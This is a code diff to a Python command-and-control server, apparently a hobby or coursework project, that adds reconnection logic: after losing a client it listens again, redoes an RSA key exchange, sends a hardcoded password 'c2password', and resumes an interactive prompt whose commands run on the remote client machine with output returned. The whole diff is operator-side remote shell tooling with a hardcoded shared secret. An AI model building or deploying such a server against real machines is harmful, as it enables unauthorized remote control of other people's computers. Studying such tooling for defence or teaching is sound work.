@@ -45,6 +45,8 @@ def encrypt_and_send(message):
 
 def receive_and_decrypt():
     encrypted_message = connection_socket.recv(config.PAYLOAD_SIZE)
+    if not encrypted_message:
+        return encrypted_message
     message = decrypt_cipher.decrypt(encrypted_message).decode()
     return message
 
@@ -52,19 +54,48 @@ def receive_and_decrypt():
 password = "c2password"
 encrypt_and_send(password)
 
-# Server REPL loop - run the interactive shell
+# LOOPS ON LOOPS! look for client connections
 while True:
-    # Read in command from input
-    command = input(":3 ")
-    # Note: break out of loop if the command was 'exit' or 'hangup'
-    stripped_cmd = command.strip().lower()
-    if stripped_cmd == "exit" or stripped_cmd == "hangup":
-        # Tell the client to shut down, end server program
-        encrypt_and_send(stripped_cmd)
-        # TODO should I really end the server program? how to get back in touch, then?
-        break
-    # Execute the command on the remote machine (client)
-    encrypt_and_send(command)
-    # Print the results
-    decrypted_results = receive_and_decrypt()
-    print(decrypted_results)
+
+    # Server REPL loop - run the interactive shell
+    while True:
+        # Read in command from input
+        command = input(":3 ")
+        # Note: break out of loop if the command was 'exit' or 'hangup'
+        stripped_cmd = command.strip().lower()
+        if stripped_cmd == "exit" or stripped_cmd == "hangup":
+            # Tell the client to shut down, end server program
+            encrypt_and_send(stripped_cmd)
+            # TODO should I really end the server program? how to get back in touch, then?
+            break
+        # Execute the command on the remote machine (client)
+        encrypt_and_send(command)
+        # Print the results
+        decrypted_results = receive_and_decrypt()
+        if not decrypted_results:
+            print("Lost connection with client.")
+            break
+        print(decrypted_results)
+    
+    # Connect with the client again
+    print("Server now listening at on port %s" % (ADDRESS[1]))
+
+    # Accept a connection
+    connection_socket, client_addr = server_socket.accept()
+    print("Connected to %s on port %s" % (client_addr[0], client_addr[1]))
+
+    # Create RSA key pair
+    server_key = RSA.generate(config.KEY_SIZE)
+    server_public_key = server_key.publickey()
+    decrypt_cipher = PKCS1_OAEP.new(server_key)
+
+    # Send the server's public key
+    connection_socket.send(server_public_key.exportKey())
+
+    # Receive the client's public key
+    client_public_key = RSA.importKey(connection_socket.recv(config.PAYLOAD_SIZE))
+    encrypt_cipher = PKCS1_OAEP.new(client_public_key)
+
+    # Send over the password for the client (only one client, o.w. we'd use diff passwords)
+    password = "c2password"
+    encrypt_and_send(password)
